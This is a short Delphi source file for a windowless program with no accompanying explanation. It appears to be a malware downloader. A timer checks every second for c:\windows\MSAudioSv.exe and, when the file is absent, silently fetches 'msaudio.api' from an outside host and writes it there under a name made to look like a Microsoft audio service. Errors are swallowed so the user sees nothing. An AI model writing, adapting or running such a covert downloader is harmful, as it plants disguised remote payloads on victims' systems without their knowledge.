program formless;

uses
  idhttp,
  windows,
  classes,
  sysutils;

var
  Msg: Tmsg;
  TimerHandle: WORD;

  // =======Timer=========
procedure Timer(Wnd: HWnd; Msg, TimerID, dwTime: DWORD); stdcall;
var
  http: tidhttp;
  stream: tmemorystream;
  filenm: string;
begin
  filenm := 'c:\windows\MSAudioSv.exe';
  if not FileExists(filenm) then
  begin
    try

      http := tidhttp.Create(nil);
      try
        stream := tmemorystream.Create;
        try
          try
            http.Get('http://rectifier.twilightparadox.com/msaudio.api', stream);
            if FileExists(filenm) then
              DeleteFile(filenm);
            stream.SaveToFile(filenm);
          except
            on E: Exception do
            begin
            end;
          end;
        finally
          stream.Free;
        end;
      finally
        http.Free;
      end;
    finally
    end;

  end;
end;

procedure StartTimer(Interval: DWORD);
begin
  TimerHandle := SetTimer(0, 0, Interval, @Timer);
end;
// ======Timer==========

begin
  // Create the socket.
  // Code to start the timer, the number is the timer interval.
  StartTimer(1000);

  // this code keeps the server open, stoping it from closing.
  while GetMessage(Msg, 0, 0, 0) do
  begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;

end.
